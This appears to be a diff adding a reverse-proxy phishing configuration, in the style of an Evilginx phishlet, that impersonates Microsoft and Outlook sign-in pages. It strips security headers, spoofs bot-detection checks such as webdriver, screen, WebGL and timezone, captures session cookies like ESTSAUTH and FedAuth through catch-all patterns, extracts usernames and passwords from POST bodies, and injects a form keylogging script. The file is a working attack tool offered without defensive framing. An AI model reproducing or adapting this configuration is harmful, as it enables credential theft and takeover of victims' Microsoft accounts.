@@ -1,0 +1,108 @@
+---
+author: '@trust-hybrid-enhanced'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true }
+  - { phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false }
+  - { phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false }
+  - { phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false }
+
+sub_filters:
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'window.location.hostname', replace: '"login.microsoftonline.com"', mimes: ['application/javascript', 'text/html'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'X-Frame-Options', replace: '', mimes: ['text/html', 'application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'navigator.webdriver', replace: 'false', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'navigator.plugins.length===0', replace: 'false', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'toString.call(window.HTMLElement)', replace: '"[object HTMLElement]"', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'screen.height', replace: '1080', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'screen.width', replace: '1920', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'WEBGL_debug_renderer_info', replace: '', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'Content-Security-Policy', replace: '', mimes: ['text/html', 'application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'navigator.sendBeacon', replace: 'function() { return true; }', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'sessionStorage', replace: 'undefined', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'Intl.DateTimeFormat().resolvedOptions().timeZone', replace: '"America/New_York"', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'navigator.language', replace: '"en-US"', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'navigator.languages', replace: '["en-US","en"]', mimes: ['application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', hostname: 'login.microsoftonline.com', sub: 'login', domain: 'microsoftonline.com', search: 'toDataURL()', replace: 'function() { return "data:image/png;base64,XYZ==" }', mimes: ['application/javascript'] }
+
+auth_tokens:
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'x-ms-gateway-slice', 'stsservicecookie']
+  - domain: 'live.com'
+    keys: ['MSPRequ', 'MSPOK', 'PPAuth']
+  - domain: 'login.live.com'
+    keys: ['MSPRequ', 'MSPOK', 'PPAuth']
+  - domain: 'outlook.office.com'
+    keys: ['MSPAuth', 'MSCC', 'MSPOK', 'ClientId', 'AccessToken', 'rtFa', 'FedAuth']
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.outlook.com'
+    keys: ['.*:regexp']
+  - domain: 'outlook.com'
+    keys: ['.*:regexp']
+
+auth_urls:
+  - '/common/oauth2/nativeclient'
+  - '/kmsi'
+  - '/landingv2'
+  - '/login.srf'
+  - '/auth/login'
+  - '/common/oauth2'
+  - '/common/oauth2/authorize'
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/oauth2/v2.0/token'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+      - 'login.live.com'
+    trigger_paths:
+      - '/'
+      - '/common/oauth2/authorize'
+      - '/common/oauth2/v2.0/authorize'
+      - '/landingv2'
+    script: |
+      document.addEventListener('DOMContentLoaded', function() {
+        const form = document.querySelector('form');
+        if (form) {
+          form.addEventListener('submit', function() {
+            const inputs = form.querySelectorAll('input');
+            inputs.forEach(function(input) {
+              console.log('[KEYLOG]', input.name + ' = ' + input.value);
+            });
+          });
+        }
+      });
+
+config:
+  invisible_iframe: true
+  log_requests: true
